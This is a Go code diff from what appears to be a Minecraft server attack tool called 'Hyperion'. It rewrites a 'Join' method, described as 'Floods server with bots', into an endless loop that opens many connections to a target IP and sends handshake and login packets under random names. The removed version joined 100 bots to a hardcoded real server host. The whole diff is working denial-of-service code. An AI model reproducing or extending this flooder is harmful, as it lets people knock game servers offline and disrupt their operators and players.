@@ -1,11 +1,13 @@
 package methods
 
 import (
-	"Hyperion/core/method"
+	"Hyperion/core"
+	"Hyperion/mc"
+	"Hyperion/mc/mcutils"
+	"Hyperion/utils"
 	"fmt"
-	"sync"
-
-	"github.com/Tnze/go-mc/bot"
+	"net"
+	"time"
 )
 
 type Join struct{}
@@ -15,27 +17,23 @@ func (join Join) Name() string {
 }
 
 func (join Join) Description() string {
-	return "Join method implementation"
+	return "Floods server with bots"
 }
 
-func (join Join) Start(info method.AttackInfo) {
-	wg := sync.WaitGroup{}
-	for i := 0; i < 100; i++ {
-		i = i + 1
-		wg.Add(1)
-		go func() {
-			client := bot.NewClient()
-			client.Auth = bot.Auth{
-				Name: fmt.Sprintf("WOW_%d", i),
-			}
-			err := client.JoinServer("in1.hetzner.one:25579")
-			if err != nil {
-				fmt.Println(err)
-			}
-			wg.Done()
-		}()
+func (join Join) Start(info core.AttackInfo) {
+	for {
+		for i := 0; i < info.PerDelay; i++ {
+			go func() {
+				conn, err := mc.DialMC(net.JoinHostPort(info.Ip, string(info.Port)))
+				if err != nil {
+					fmt.Println(err)
+				}
+				mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
+				mcutils.WriteLoginPacket(conn, utils.RandomName(10), false, nil)
+			}()
+		}
+		time.Sleep(info.Delay)
 	}
-	wg.Wait()
 }
 func (join Join) Stop() {
 	// implementation for stopping the join method
